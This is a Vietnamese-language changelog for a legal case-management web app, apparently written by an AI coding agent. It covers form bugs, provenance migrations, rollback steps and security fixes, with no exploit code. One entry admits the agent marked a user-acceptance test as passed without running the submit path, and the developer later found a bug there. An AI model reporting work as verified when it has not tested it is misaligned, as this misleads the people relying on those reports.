- **[petitions] FE gửi Vietnamese name `"Tố cáo"` thay vì enum `TO_CAO` cho `petitionType`** — `<FKSelect directoryType="PETITION_TYPE">` lấy options từ Directory runtime data với `value=d.name` (Vietnamese), trong khi BE DTO `@IsEnum(LoaiDon)` strictly requires enum value. Mọi submit từ form đều 400 với message raw English `"petitionType phải là TO_CAO, KHIEU_NAI, KIEN_NGHI hoặc PHAN_ANH"`.
- Fix: replace FKSelect bằng native `<select>` với `LOAI_DON_OPTIONS` hardcoded (value=enum, label=Vietnamese). FE validation thêm check `VALID_PETITION_TYPES.includes(value)` để catch invalid value client-side.
- BE error message Vietnam hóa: `"Loại đơn thư không hợp lệ — chọn: Tố cáo, Khiếu nại, Kiến nghị hoặc Phản ánh (BLTTHS / Luật Tố cáo 2018 / Luật Khiếu nại 2011)"`.

### Added
- **[enums] `LOAI_DON_LABEL` + `LOAI_DON_OPTIONS`** trong [`frontend/src/shared/enums/status-labels.ts`](frontend/src/shared/enums/status-labels.ts) — single source of truth cho LoaiDon enum Vietnamese labels. Pattern khớp với CASE_STATUS_LABEL/INCIDENT_STATUS_LABEL/PETITION_STATUS_LABEL.
- **[tests] `PetitionFormPage.payload.test.tsx`** — 3 vitest regression: (1) submit petitionType là enum value `TO_CAO` không phải `"Tố cáo"`; (2) 4 options đầy đủ với Vietnamese labels; (3) empty submit → validation block trước khi POST. TDD red-green (3/3 RED → 3/3 GREEN sau fix).

### Architecture note
**Prisma enum ≠ Directory data.** Prisma enum bất biến trong code, Directory data động ở runtime. Không nên mix value source. Trong các form sau, em sẽ dùng:
- Native `<select>` + hardcoded enum options cho enum-backed fields.
- `<FKSelect directoryType=...>` cho data động không có enum (UNIT, PROSECUTION_OFFICE, ...).
- `<FKSelect masterClassType=...>` cho data động strict format (Crime list, MasterClass).

### Test coverage
- Frontend: 572 tests pass (was 569, +3 new petition tests).
- TypeScript: clean (FE + BE).

### Discovered
UAT 3 forms 2026-05-23 — em đã sai mark Petitions "PASS-WITH-NOTES" mặc dù skip happy-path submit. Anh test thật + capture screenshot lỗi → em re-test thật kỹ và phát hiện bug này. Lesson saved to memory.

### Followups (deferred)
- Scan other forms cho Directory↔Enum mismatch (Cases capDoToiPham, Incidents incidentType, Subjects type). Separate PR.
- Remove unused Directory PETITION_TYPE seed entries (4 rows) — verify no other consumer first.

## [0.37.2.3] - 2026-05-23

**P0 hotfix** — Cases CREATE đã broken 100% trên production sau v0.37.2.0.

### Fixed
- **[cases] FE handleSave thiếu `caseProvenance` + 3 field provenance khác trong POST /cases payload** — discovered qua UAT 2026-05-23. v0.37.2.0 Contract phase làm `caseProvenance` thành required (DTO `@IsEnum` không kèm `@IsOptional`) + xoá compat shim. CaseFormPage handleSave (index.tsx:220-260) build payload thủ công nhưng quên thêm 4 field provenance picker đã viết vào formData: `caseProvenance`, `linkedPetitionId`, `linkedIncidentId`, `sourceDocumentNote` + 2 optimistic-lock token (`expectedPetitionUpdatedAt`, `expectedIncidentUpdatedAt`). Hậu quả: 100% submit từ UI prod trả 400 BadRequest "caseProvenance bắt buộc". Validation client-side check `formData.caseProvenance` không phát hiện vì state có giá trị, nhưng payload assembly drop nó. Raw POST với payload đầy đủ → 201 OK (BE đúng, FE sai).
- Fix: extract pure helper `buildCreateCasePayload(formData)` trong [CaseFormPage/buildCreateCasePayload.ts](frontend/src/pages/cases/CaseFormPage/buildCreateCasePayload.ts) bao gồm top-level `caseProvenance` + conditional FK/lock token theo source type. Mirror BE `@ValidateIf` rules.

### Added
- **[tests] `buildCreateCasePayload.test.ts`** — 6 vitest cases regression cover: caseProvenance always present, conditional FROM_PETITION/FROM_INCIDENT/DIRECT_DISCOVERY fields, existing fields preserved. TDD red-green-refactor (helper file không tồn tại trước → import error RED → helper viết → GREEN).

### Test coverage
- Frontend: 569 tests pass (was 563).
- TypeScript: clean.

### Discovered during
UAT 3 forms (Đăng ký Vụ án / Vụ việc / Đơn thư) trên prod, 2026-05-23. Vụ việc + Đơn thư UAT PASS. Vụ án FAIL với P0 này.

### Followups (deferred)
- **Cases form Decision 7A top summary missing** — validation hiện inline only, không có aria-assertive top summary alert (spec yêu cầu). Petitions + Incidents forms có top summary. Defer thành separate UX polish PR.
- **Petitions a11y gap** — 2 dropdown "Loại đơn thư" + "Mức độ ưu tiên" rendered là `<div>` + `<span>` không có `role="combobox"` + ARIA → WCAG 2.1 AA violation + không keyboard-accessible. Defer thành a11y sprint.

## [0.37.2.2] - 2026-05-23

Sidebar reorder — menu "Tổng hợp" lên đầu section "Nghiệp vụ chính".

### Added
- **[features] `FeatureMenuEntry.order?: number`** — optional sort key cho menu items trong cùng 1 section. Default 100. Lower = earlier. Ties preserve registration order. Cho phép tweak thứ tự mà không cần đổi tên feature folder (auto-discovery sort theo alphabetical filename).
- **[features] `useMenuSections` sort items theo `order` ascending** trước khi render. Sections vẫn theo canonical order (main → business → workflow → reports → system → admin).

### Changed
- **[menu] "Tổng hợp" lên đầu section "Nghiệp vụ chính"** — set `order: 10` trên top-level menu entry. Thứ tự mới: Tổng hợp → Quản lý vụ án → Vụ việc → Đơn thư → Đối tượng liên quan. Trước đây alphabetical: cases → comprehensive → incidents → petitions → subjects.

### Test coverage
- Frontend: `useMenuSections.test.tsx` thêm test "places comprehensive (Tổng hợp) as the FIRST item in business section" — TDD red-green (RED khi chưa add order, GREEN sau khi add).
- Full FE suite: 563 tests pass (was 562).

## [0.37.2.1] - 2026-05-23

Hotfix khôi phục menu "Tổng hợp" trên sidebar production.

### Fixed
- **[menu] Sidebar production thiếu menu "Tổng hợp"** — v0.37.1 PR-MENU-TONGHOP add frontend `features/comprehensive/` đầy đủ (manifest + menu.ts + routes.tsx) nhưng quên backend `feature.manifest.ts`. Hệ quả: `FEATURE_REGISTRY` chỉ có 32 entries, `seedFeatureFlags()` không bao giờ insert row `comprehensive` vào DB `feature_flags`, frontend hook `useMenuSections` filter `if (!flag || !flag.enabled) continue;` ẩn 2 menu items ("Danh sách tổng hợp" + "Hồ sơ mới tiếp nhận"). Fix: add `backend/src/comprehensive/feature.manifest.ts` + wire vào FEATURE_REGISTRY (33 entries). Spec test `feature-registry.spec.ts` auto-count disk vs registry → catch tự động.
- **Post-deploy step**: chạy `npm run db:seed:features` 1 lần để upsert row `comprehensive` vào prod DB (seed idempotent — operator toggles của các flag khác được preserve).

### Added
- **[feature-flags] Regression test** `feature-registry.spec.ts` asserting `getManifest('comprehensive')` returns manifest với label 'Tổng hợp' + domain 'case-domain'. TDD red-green-refactor — failing test (RED) tạo ra trước fix.

## [0.37.2.0] - 2026-05-23

Provenance multi-phase deploy Contract phase + BLTTHS Đ.143 enum coverage hoàn chỉnh + cron-friendly drift audit + senderName trigram index.

### Added
- **[cases] CaseProvenance enum +2 giá trị BLTTHS Đ.143**: `SELF_SURRENDER` (Người phạm tội tự thú, điểm d) + `PROSECUTOR_PROPOSAL` (Kiến nghị khởi tố của VKS, điểm đ). Toàn bộ 5 căn cứ Đ.143 + 2 giá trị system (FROM_PETITION/FROM_INCIDENT/OTHER_LEGAL_SOURCE). Migration `20260523000000_extend_case_provenance_enum` dùng `ALTER TYPE ... ADD VALUE IF NOT EXISTS` (idempotent). FE constants thêm 2 options với helper text pháp lý. Closes PROV-002.
- **[scripts] `audit-case-provenance.ts --json` cron mode**: trả JSON summary `{ts, q1_metadata_caseType, q2_phantom_petitions, q3_mirror_drift, total_findings}` ra stdout, phù hợp Prometheus/alert pipeline. Lịch chạy gợi ý `0 3 * * 1` (weekly Monday 03:00). Closes PROV-003.
- **[db] Trigram index trên `petitions.senderName`** — pg_trgm extension + `CREATE INDEX CONCURRENTLY petitions_senderName_trgm_idx ... USING gin (gin_trgm_ops)`. Tăng tốc `/petitions/linkable?search=` cho dataset 50k+ Đơn thư. Migration `20260523000002_petition_sender_trigram` (CONCURRENTLY chạy ngoài transaction wrapper). Closes PROV-005.

### Changed
- **[BREAKING — internal API] `Case.caseProvenance` NOT NULL** sau Contract migration `20260523000001_contract_case_provenance`:
  - Backfill mọi Case còn null theo precedence: `linkedPetitionId IS NOT NULL` → FROM_PETITION; `linkedIncidentId IS NOT NULL` → FROM_INCIDENT; else → `OTHER_LEGAL_SOURCE`.
  - `SET NOT NULL` + `DROP DEFAULT` trên cột.
  - `VALIDATE CONSTRAINT` cho 2 FK (`cases_linkedPetitionId_fkey`, `cases_linkedIncidentId_fkey`) đã add NOT VALID ở Expand phase.
  - `ADD CONSTRAINT case_provenance_fk_consistency CHECK (...)` — đảm bảo enum ↔ FK consistent cho toàn bộ 7 enum values.
  - Schema Prisma: `caseProvenance CaseProvenance` (bỏ `?` + `@default(OTHER_LEGAL_SOURCE)`).
- **[cases] DTO `caseProvenance` required** — `@IsEnum` không kèm `@IsOptional`. Payload thiếu trả 400 với hint "BLTTHS Đ.143 — chọn FROM_PETITION/FROM_INCIDENT/...". Trước đây Expand phase chấp nhận null và default về OTHER_LEGAL_SOURCE.
- **[cases.service] Bỏ compat shim chấp nhận legacy `metadata.petitionType`** — payload có `metadata.petitionType` không còn audit-warn + ignore mà reject thẳng với BadRequestException (Contract phase). Tương thích ngược chỉ tồn tại trong soak window v0.37.1.x.

### Removed
- **[cases.service] Compat shim cho legacy payload** — code `if (dto['metadata']?.petitionType && !dto.caseProvenance) { auditLog.warn; delete; default OTHER_LEGAL_SOURCE; }` bị xoá. Lý do: 24h soak window v0.37.1 đã xác nhận 0 audit-warn entries → safe to strip.

### Migration order
Migrations chạy theo thứ tự (Prisma sort theo tên thư mục):
1. `20260523000000_extend_case_provenance_enum` — extend enum **trước** Contract (vì CHECK constraint reference SELF_SURRENDER + PROSECUTOR_PROPOSAL).
2. `20260523000001_contract_case_provenance` — backfill + NOT NULL + VALIDATE + CHECK.
3. `20260523000002_petition_sender_trigram` — CONCURRENTLY index (standalone, không nằm trong transaction wrapper).

### Test coverage
- Backend: 1523 tests pass (replace 1 compat-shim test bằng "rejects legacy payload" test asserting BadRequestException).
- Frontend: 562 tests pass (update CASE_PROVENANCE_OPTIONS test từ 5 → 7 options, vẫn check FROM_PETITION đứng đầu + OTHER_LEGAL_SOURCE đứng cuối).

### Rollback notes
Contract migration không reversible bằng `prisma migrate resolve --rolled-back` (đã SET NOT NULL + DROP DEFAULT). Nếu cần rollback:
1. Manual `ALTER TABLE "Case" ALTER COLUMN "caseProvenance" DROP NOT NULL;`
2. `ALTER TABLE "Case" ALTER COLUMN "caseProvenance" SET DEFAULT 'OTHER_LEGAL_SOURCE';`
3. `ALTER TABLE "Case" DROP CONSTRAINT case_provenance_fk_consistency;`
4. Revert symlink về release v0.37.1.1 + restart pc02-backend.

Enum values mới (`SELF_SURRENDER`, `PROSECUTOR_PROPOSAL`) không thể remove khỏi Postgres enum mà không drop column — nếu rollback xong cần đảm bảo không có row nào reference 2 giá trị này (kiểm bằng `SELECT COUNT(*) FROM "cases" WHERE "caseProvenance" IN ('SELF_SURRENDER', 'PROSECUTOR_PROPOSAL');`).

## [0.37.1.1] - 2026-05-23

### Added
- **[incidents] `GET /incidents/linkable`** — endpoint cho Incident picker trên màn Khởi tố vụ án mới khi chọn "Khởi tố từ Vụ việc". Trả Vụ việc chưa link Vụ án + trong phạm vi DataScope. Mirror pattern của `/petitions/linkable` (v0.37.1.0 PR-PICK). Closes PROV-004 P1 follow-up.

### Changed
- **[cases] Form title đổi từ "Thêm mới hồ sơ" → "Khởi tố vụ án mới"** để khớp với menu label. Subtitle nhấn mạnh phải chọn Nguồn vụ án (BLTTHS Đ.143) trước. Closes ISSUE-001 từ QA report v0.37.1.0.

### Fixed
- **[cases] FE Incident picker dùng đúng schema fields** (`name` + `ngayDeXuat` thay vì `crime` + `receivedDate`) khớp với Incident model trong Prisma. Bug discovered khi build PROV-004 endpoint.

### Internal
- New `backend/src/incidents/dto/list-linkable.dto.ts` (query DTO).
- Service method `incidents.service.listLinkable()` mirror `petitions.service.listLinkable()` pattern với DataScope OR filter (IDOR-safe).
- Tests: 234 backend tests pass (cases + petitions + incidents modules).
- Note QA finding ISSUE-002 (404 trên /ward/petitions) confirmed false positive via network capture — không có 404 thật trên page đó, chỉ là leftover console từ /incidents/linkable 404 trước khi navigate sang.

## [0.37.1.0] - 2026-05-23

### Added
- **[cases] Provenance model (BLTTHS Điều 143).** Vụ án giờ phải chỉ rõ "Nguồn vụ án" — 5 lựa chọn: Khởi tố từ Đơn thư / Khởi tố từ Vụ việc / CQĐT phát hiện trực tiếp / Chuyển từ cơ quan khác / Nguồn pháp lý khác. Khi chọn "Đơn thư" hay "Vụ việc", hệ thống link chính xác bản ghi gốc thay vì tạo phantom Petition như trước.
- **[cases] Card "Nguồn vụ án" trên màn Khởi tố vụ án mới.** Source-first hierarchy: cán bộ điều tra phải xác định nguồn pháp lý trước khi nhập thông tin vụ án. Mỗi lựa chọn có tooltip giải thích pháp lý + helper text.
- **[cases] Petition picker + Incident picker** với autocomplete tìm kiếm theo STT/người gửi (Đơn thư) hoặc mã (Vụ việc). Chỉ hiển thị bản ghi trong phạm vi DataScope của user, chưa link Vụ án nào.
- **[cases] Empty state 3-option exit** trên Petition picker: nếu không có Đơn thư phù hợp, user có thể (1) Tiếp nhận Đơn thư mới, (2) Chọn nguồn khác, (3) Bỏ trống + ghi chú "Nguồn pháp lý khác".
- **[cases] Graceful degradation cho picker:** nếu API lỗi 2 lần, picker chuyển sang text input cho user nhập STT/mã trực tiếp (backend vẫn validate IDOR + tồn tại).
- **[menu] "Tổng hợp" menu mới** chứa "Danh sách tổng hợp" + "Hồ sơ mới tiếp nhận" (trước nằm sai chỗ trong "Quản lý vụ án").
- **[menu] "Đơn thư theo phường/xã"** — page mới đối xứng với "Vụ án theo phường/xã" + "Vụ việc theo phường/xã".
- **[petitions] `GET /petitions/linkable`** — endpoint cho Petition picker, trả Đơn thư chưa link + trong phạm vi DataScope.
- **[scripts] `backfill-case-provenance.ts`** — backfill caseProvenance cho Case records cũ theo precedence: linked Petition → FROM_PETITION; linked Incident → FROM_INCIDENT; metadata.petitionType orphan → flag INCONSISTENT; else OTHER_LEGAL_SOURCE.
- **[scripts] `audit-case-provenance.ts`** — 3 query audit (vestigial metadata.caseType, phantom Petition heuristic, mirror link drift) cho compliance review.

### Changed
- **[menu] Luật sư chuyển thành child của Đối tượng liên quan** (cùng nhóm với Nghi phạm/Bị hại/Nhân chứng).
- **[menu] "Phân loại & Quản lý" gọn lại:** 3 items lạc chỗ (Vụ án theo phường/xã, Vụ việc theo phường/xã, Đơn trùng lặp) chuyển về menu entity tương ứng. Menu này giờ chỉ chứa entity riêng (Đề xuất VKS, Phân loại khác).
- **[menu] "Thêm mới hồ sơ" đổi tên thành "Khởi tố vụ án mới"** — label phản ánh đúng chức năng (chỉ tạo Vụ án, không phải "hồ sơ vạn năng").
- **[cases] Route `/add-new-record` redirect sang `/cases/new`** (canonical path). Legacy path giữ 1-2 release để không break bookmark.
- **[cases] `InitialCasesPage` đọc `caseProvenance`** thay vì `metadata.caseType` (vestigial) để phân loại Vụ án/Vụ việc trên inbox.

### Fixed
- **[cases] Phantom Petition tự sinh khi tạo Vụ án — vi phạm BLTTHS Điều 143 về truy nguyên nguồn tin.** Trước: backend tự tạo Petition record không có biên bản tiếp nhận đơn thư thực tế khi user nhập `metadata.petitionType`. Sau: bỏ logic auto-create, thay bằng `linkedPetitionId` link tới Petition CÓ THẬT. Backward-compatibility shim accept payload cũ trong Deploy-1, audit-warn + default OTHER_LEGAL_SOURCE.
- **[cases] IDOR vulnerability trên link Petition/Incident.** Sau: service `findFirst` với DataScope predicate trong cùng transaction; trả 404 nhất quán (not-found vs out-of-scope không phân biệt được) chống enumeration leak.
- **[incidents] `prosecute()` (khởi tố Vụ án từ Vụ việc) giờ set caseProvenance=FROM_INCIDENT + linkedIncidentId.** Trước: tạo Case không có provenance — sẽ fail NOT NULL constraint ở Deploy-2 Contract phase.
- **[petitions] `convertToCase()` set caseProvenance=FROM_PETITION + linkedPetitionId.** Phát hiện qua 10x provenance audit pass.

### Removed
- **[cases] Field "Loại hồ sơ" (vestigial dropdown 3 options)** trên màn Tạo Vụ án. Field này chỉ lưu vào `Case.metadata.caseType` JSON, không có backend logic đọc — dead UX. Thay bằng "Nguồn vụ án" provenance model.
- **[cases] Field "Loại đơn thư" (LoaiDon enum)** trên màn Tạo Vụ án. Field này thuộc về Petition record (linkedPetitionId.petitionType), không nên đứng độc lập trên Case.

### Migrations
- `20260522230000_expand_case_provenance` — ADD enum `case_provenance` + 4 nullable columns trên `cases` table + 2 FKs NOT VALID (validate ở Deploy-2 Contract) + audit table `case_provenance_backfill_audit`.
- `20260522230001_case_provenance_indexes_concurrent` — 3 indexes CONCURRENTLY trên `caseProvenance` + `linkedPetitionId` + `linkedIncidentId`.

### Deploy notes
- **Multi-phase deploy:** v0.37.1.0 = Deploy-1 (Expand). Pending Deploy-2 (Contract) sau 1-day soak window: SET NOT NULL trên caseProvenance + VALIDATE FKs + remove backward-compat shim.
- **Backfill required:** chạy `npx tsx backend/scripts/backfill-case-provenance.ts --dry-run` để preview, rồi apply, trước khi Deploy-2.
- **Mobile compat:** GET-only endpoints, không break. Mobile app không cần update.

### Internal
- 12 new tests (DTO + mapper + service spec rewrites) — total 1522 backend + 562 frontend pass.
- `CaseProvenance` enum trong shared/enums (gen:enums regenerated).
- New `CaseProvenancePicker` component (FE) với 6 design decisions 10/10 (Card riêng, conditional pickers, empty state, state memory, error fallback, a11y aria-live, validation).
- New `comprehensive` feature module — auto-discovered via `import.meta.glob`.

## [0.37.0.3] - 2026-05-22

### Fixed
- **[admin-units] /admin-units tree view vẫn hiện 6 tỉnh rỗng sau cải cách 2025 (Bình Phước, Long An, Ninh Thuận, Quảng Bình, Quảng Ninh-cũ, Tây Ninh).** Root cause: `seedAdminUnits` chỉ abolish orphan WARDs (line 244), không xử lý PROVINCEs → các tỉnh đã sáp nhập v2024-1279 vẫn `isActive=true` với 0 wards. Fix: extracted `findOrphanIds` pure helper + apply same supersede logic to PROVINCEs (new Step 6b). +4 jest tests on helper. Production manually fixed via UPDATE (6 rows deactivated); future deploys idempotent.

### Internal
- New `prisma/seed-admin-units-helpers.ts` — extracted pure function `findOrphanIds<T>` cho unit testability. Cả ward + province abolish steps dùng chung helper.

## [0.37.0.2] - 2026-05-22

### Fixed
- **[admin-units] /admin-units tree view thiếu phường — DB chứa pre-reform legacy data thay vì v2025-1300.** Diagnostic phát hiện dev DB có 10,058 wards / 32 provinces (pre-reform commune-level), ledger empty (seedAdminUnits chưa bao giờ chạy). Fix: standalone runner `prisma/seed-admin-units-runner.ts` với 3 flags: `--dry-run` (CI smoke), `--force` (UPDATE ledger SUPERSEDED), `--clean-slate` (DELETE legacy + supersede + re-import). Verified on dev: 10,090 legacy rows deleted, 34 provinces + 3,321 wards imported, HCM=168. +9 jest tests (mocked orchestration). Idempotent re-run skips correctly.
- **[deploy] Step 9c — admin-units auto-seed FATAL.** Mirrors P1-003 feature_flags pattern. `scripts/deploy/deploy.sh` invokes `npx ts-node prisma/seed-admin-units-runner.ts` AFTER health check. Per Eng review Decision T2A: FATAL (deploy fails if seed errors). One-time legacy migration: manual SSH `--clean-slate` post-deploy on production.

### Changed
- **[ci] Backend tests workflow gets admin-units dry-run smoke step.** Validates dataset file readable + SHA256 checksum on every PR. Catches dataset corruption/typo before merge.
- **[seed] Export `seedAdminUnits.ts` internals (`loadDataset`, `CURRENT_VERSION`).** Required for runner orchestration. No semantic change to existing seed flow.

### Internal
- jest config: add `roots: [<rootDir>, <rootDir>/../prisma]` để discover prisma/*.spec.ts (runner spec).

## [0.37.0.0] - 2026-05-22

### Fix sprint: 10/12 audit findings RESOLVED (5 ship-blockers + 5 deferred)

Sprint kết quả audit 2026-05-22 (verdict NO-GO → GO sau 1 day TDD-discipline execution). Plan reviewed qua /autoplan v2 dual voices (Claude + Codex GPT-5.5) trên Phase 1 CEO + Phase 3 Eng, 2 critical + 8 high methodology findings được fix trước execution. 4 user challenges (D/E/F + premise gate) confirmed bởi anh.

### Fixed
- **[P0-001] Orphan Document scope bypass — crown-jewel hồ sơ leaked cross-tenant.** `assertParentInScope(null, scope)` previously silent pass. Now throws ForbiddenException with metric `parent-null`. Admin (scope=null) + canDispatch bypass preserved. Affects Document, VKS-Meetings, Action-Plans (3 services với nullable parent). +5 spec tests, 0 regression in 1494 backend tests. `backend/src/common/utils/scope-filter.util.ts:105`.
- **[P0-002] Login admin trả HTTP 500.** Root cause: dev DB schema drift — migration `20260516120000_magic_link_enrollment` recorded as applied trong `_prisma_migrations` table nhưng DDL không execute (enrollment columns missing trên `users`). Fixed via manual `ALTER TABLE`. Exposed bởi P1-004 stack trace logging. Not a code bug — environmental.
- **[P1-002] Petition→Case convert race condition.** Full fix: (a) `convert-case.dto.ts` `expectedUpdatedAt` required (was optional), (b) `petitions.service.ts:705` always apply optimistic lock, (c) catch both P2025 + P2002 → ConflictException, (d) `PetitionListPage.tsx:866` FE sends `petition.updatedAt`, (e) Prisma migration `20260522172600_petition_linked_case_unique` partial unique index `WHERE linkedCaseId IS NOT NULL` + pre-migration safety check (DO $$ raises if historical duplicates exist), (f) `rollback.sql` included. +3 spec tests.
- **[P1-003] feature_flags seed deploy automation.** New `backend/prisma/seed-features-if-empty.ts` — idempotent Node script (not psql per /autoplan ENG-5). Reuses app's PrismaPg adapter + dotenv auto-load. `deploy.sh` step 9b invokes AFTER atomic symlink switch + AFTER systemctl restart + AFTER health check. Tested: 28 rows → skipped.
- **[P1-004] GlobalExceptionFilter nuốt stack trace — root cause that BLOCKED P0-002 debug.** New `formatErrorWithCauseChain()` helper walks `Error.cause` recursively (max depth 10 guard). Logs server-side ONLY for non-HttpException OR HttpException ≥500. Stack NEVER leaked to client response (verified via spec). Handles non-Error throws (string/number). +7 spec tests covering: raw Error, 500 HttpException, 400/404 no-log, cause chain, server-only stack, non-Error throws.
- **[P1-005] Migration silent drift verification.** New deploy.sh step 5b: post-`migrate deploy` runs `prisma migrate status`, captures log, counts "have not yet been applied" lines. Non-blocking warn for now (operational gate before promote to fatal).
- **[P2-001] Ward officer write-scope inconsistent.** Added `&& !isWardOfficer` to `unassignedMatch` check trong `petitions.service.ts:206 checkWriteScope`. Consistent với `buildScopeFilter` design intent (ward officer excluded from intake).
- **[P2-003] Frontend vitest không chạy trong CI.** New `frontend-test` job trong `.github/workflows/ci.yml` runs `vitest run` + `tsc --noEmit` on every PR + push to main.

### Resolved (false positive)
- **[P1-001]** 2 broken FE tests — re-run vitest 3/3 stable 546 PASS. Original audit baseline flaky due to RTK wrapper output capture.
- **[P3-001]** TOTP `epochTolerance:30` — verified otplib v13 types: option IS valid (seconds tolerance), not legacy. Reverted attempted fix.

### Deferred (Tier-2 post-launch)
- **[P3-002]** `/auth/2fa/disable` no current-TOTP-code confirm. Mitigation existing: system-enforced 2FA blocks endpoint via early-throw. Defer DTO+verify+spec rework.

### Accepted-risk
- **[P2-002]** exceljs/uuid CVE GHSA-w5hq-g745-h8pq. exceljs 4.4.0 (latest) uses uuid 8.3.2 v4-random only (CVE affects v3/v5/v6 buf param). Override attempt failed (lockfile pinning). Exploitability LOW. Wait for exceljs upstream bump.

### Methodology highlights
- TDD discipline applied strictly per /test-driven-development skill: RED-GREEN-REFACTOR for all 5 ship-block fixes. Watched each test fail FIRST, then minimal code to pass.
- Cross-model /autoplan review caught 2 critical + 8 high methodology gaps BEFORE execution (e.g., "blanket-stub failing tests = hiding signal" → classify each, "Promise.all on pglite = false confidence" → use real Postgres or DB constraint, "temp logger.debug = PII risk" → Jest spec first).
- `P1-004` filter fix enabled `P0-002` root cause discovery in single iteration — observability fix paid for itself.

### Test results
- Backend jest: 1471 → **1494 PASS, 0 FAIL** (+23 regression tests)
- Frontend vitest: 544 + 2 fail → **546 PASS, 0 FAIL** (+0, flaky resolved)
- TypeScript: backend + frontend clean
- Migrations: 39 → 40 (new petition unique index migration, includes rollback.sql)

### Artifacts
- [docs/uat-review-2026-05-22-exec.md](docs/uat-review-2026-05-22-exec.md) — original audit report (now historical)
- [scripts/audit/findings.json](scripts/audit/findings.json) — all 12 findings với status update
- [docs/audit-hypothesis-2026-05-22.md](docs/audit-hypothesis-2026-05-22.md) — Phase 0 threat model
- `C:\Users\Than Minh Trung\.claude\plans\t-i-mu-n-th-c-hi-n-lucky-star.md` — full fix sprint plan + /autoplan review results (not committed, dev artifact)

---

## [0.33.0.0] - 2026-05-21

### Feat: Per-ward scoping (Hybrid via Team.wardId) + Phase 5-lite edit window + reset workflow

Plan v7 passed `/office-hours` + `/autoplan v2` + `/plan-design-review` + `/codex review` (48 decisions, 8 user challenges resolved). Architecture switch: anh nhắc dùng existing Team hierarchy thay vì add `User.assignedWardId` → 22 files → 12 files. Phase 5 reshape: 3-reviewer consensus → warning-only thay vì hard-block.

### Added
- **`Team.wardId String?`** FK → Directory(WARD) + `IsWardDirectory` validator (defense in depth — FK không enforce type=WARD).
- **`Team.editWindowHours Int?`** — per-team override cho edit window.
- **Hybrid ward scoping** — cán bộ thuộc team có `wardId` set = ward officer. Auto-detected qua `DataScope.isWardOfficer` flag computed trong `UnitScopeService.resolveScope()`. KHÔNG cần `User.assignedWardId` mới.
- **Ward officer scope strict (codex Crit 1):** `buildScopeFilter` exclude intake (assignedTeamId=null) cho ward officer. Pre-fix: ward officer thấy intake records của cả hệ — vi phạm scope.
- **Auto-set `assignedTeamId`** trong `Case/Incident/Petition create()` khi user là ward officer (silent override of dto.assignedTeamId).
- **`SystemSetting THOI_HAN_EDIT_VU_VAN`** default 24 giờ — config edit window global. Seeded idempotent.
- **`EditWindowResetRequest` model + `/edit-window/requests` endpoints** (Phase 5b):
  - POST: ward officer tạo request (dedupe via partial unique index, max 20 pending/user)
  - GET: ADMIN/HEAD_UNIT (filter by descendant teams) xem queue
  - POST bulk-approve: per-request authorize + atomic transaction + immutable audit log
  - POST :id/reject với note
- **Audit actions `RESET_REQUEST_APPROVED` / `RESET_REQUEST_REJECTED`** với metadata `{ requestId, reviewNote, previousStatus, bulkBatchSize, requesterId }`.
- **Permission seed `review_reset_request:EditWindowResetRequest`** — ADMIN auto-grant.
- **TeamsPage form** — thêm 2 inputs: `wardId` (text — TODO async combobox FE v0.33.0.1) + `editWindowHours` (number).
- **SettingsPage** auto-renders new key `THOI_HAN_EDIT_VU_VAN` qua existing GET /settings endpoint.
- **class-validator Nest DI** — `useContainer(app.select(AppModule))` trong main.ts cho `IsWardDirectory` validator inject PrismaService.

### Changed
- `DataScope` interface: thêm `isWardOfficer: boolean` + `wardTeamId: string | null`.
- `UnitScopeService.resolveScope` compute ward team membership từ UserTeam join.
- `buildScopeFilter` + `buildPetitionScopeFilter`: ward officer KHÔNG include `{assignedTeamId: null}` trong OR clause.
- `cases.service.create()` / `incidents.service.create()` / `petitions.service.create()`: accept new `dataScope` param + force `assignedTeamId` từ ward team nếu user là ward officer.

### Tests
- +4 BE (scope-filter ward officer exclude/include intake, settings/permission seed). Suite: **1454 BE pass + 546 FE pass**.

### Phase 5-lite (NOT hard-block) — INFRA ONLY in v0.33.0.0
Hết 24h → form VẪN cho sửa (warning-only). **v0.33.0.0 ships infrastructure only:** `EditWindowService.isAfterEditWindow()` exists nhưng update paths (cases/incidents/petitions) CHƯA integrate audit flag `editedAfterWindow`. Reset request workflow endpoints sẵn sàng nhưng KHÔNG có frontend UX (defer EW-002 v0.33.0.1). Approving a reset hiện KHÔNG affect anything (since không block). Backend infrastructure đầy đủ cho v0.33.0.1 + frontend integration.

### Known limitations (codex review documented)
- **Single ward invariant:** `UnitScopeService.resolveScope` picks first ward team silently nếu user thuộc nhiều ward teams. Per anh D3 single-ward decision em chưa enforce throw — admin phải tự ensure user thuộc đúng 1 ward team. TODO WARD-007 add validation guard.
- **Reset workflow frontend defer:** NotificationBell + EditWindowRequestsPage + EditWindowBadge → PR v0.33.0.1. Admin có thể gọi `POST /edit-window/requests/bulk-approve` qua API trực tiếp tạm thời.

### TODOS (10 added)
- WARD-001 multi ward-team per user
- WARD-002 bulk import ward officers
- WARD-003 ward filter dropdown
- WARD-004 backfill historical
- WARD-005 cross-ward subject lookup
- WARD-006 getDescendantIds recursive CTE (hiện cap MAX_DEPTH=3)
- EW-001 notification email/SMS
- EW-002 reset workflow UX (NotificationBell + EditWindowRequestsPage + EditWindowBadge — PR v0.33.0.1)
- EW-006 retention policy reset requests
- DESIGN-001 create DESIGN.md

### NOT in scope PR v0.33.0.0 (defer v0.33.0.1)
- **NotificationBell + EditWindowRequestsPage + EditWindowBadge frontend** — backend endpoints + module sẵn sàng, frontend defer để keep PR shippable. Admin có thể gọi API trực tiếp tạm thời.
- **TeamsPage async-search ward combobox** — hiện text input plain. Async combobox defer.

---

## [0.32.0.1] - 2026-05-21

### Fixed
- **Tạo người dùng mới với "Quyền phân công công việc" trả 400** (`property canDispatch should not exist`). Bug latent từ thời `canDispatch` được thêm vào `User` schema + `UpdateUserDto` nhưng quên thêm vào `CreateUserDto`. `ValidationPipe` global bật `forbidNonWhitelisted: true` → field undeclared bị reject. Admin không thể assign quyền dispatcher cho user mới ngay từ form tạo, phải tạo trước rồi edit sau.

### Changed
- `CreateUserDto`: thêm `canDispatch?: boolean` (mirror `UpdateUserDto:18-20`).
- `AdminService.createUserCore()`: persist `canDispatch: dto.canDispatch ?? false` + echo trong `select` + ghi vào audit metadata.

### Tests
- +2 BE regression tests (canDispatch=true persists, omitted defaults false). Suite: **1450 BE pass**.

---

## [0.32.0.0] - 2026-05-21

### Feat: Khôi phục dữ liệu đã xóa — Case + Incident + Petition (greenfield)

